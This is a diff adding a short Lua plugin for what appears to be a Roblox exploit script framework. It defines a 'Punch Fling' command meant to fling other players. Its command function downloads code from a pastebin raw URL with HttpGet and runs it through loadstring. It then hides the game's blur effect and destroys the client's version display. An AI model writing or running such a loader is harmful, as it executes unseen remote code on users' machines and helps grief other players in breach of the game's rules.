@@ -1,0 +1,18 @@
+local Plugin = {
+	["PluginName"] = "Punch Fling",
+	["PluginDescription"] = "Punch people to fling them!",
+	["Commands"] = {
+		["punch"] = {
+			["Description"] = "Loads Punch Fling",
+			["Aliases"] = {'punchf', 'pf', 'punch fling'},
+			["Function"] = function(args,speaker)
+				 loadstring(game:HttpGet("https://pastebin.com/raw/UkdzSras", true))()
+local x = game.Lighting.Blur
+x.Parent = game.ReplicatedStorage
+game:GetService("CoreGui").VersionGui:Destroy()
+			end,
+		},
+	},
+}
+
+return Plugin
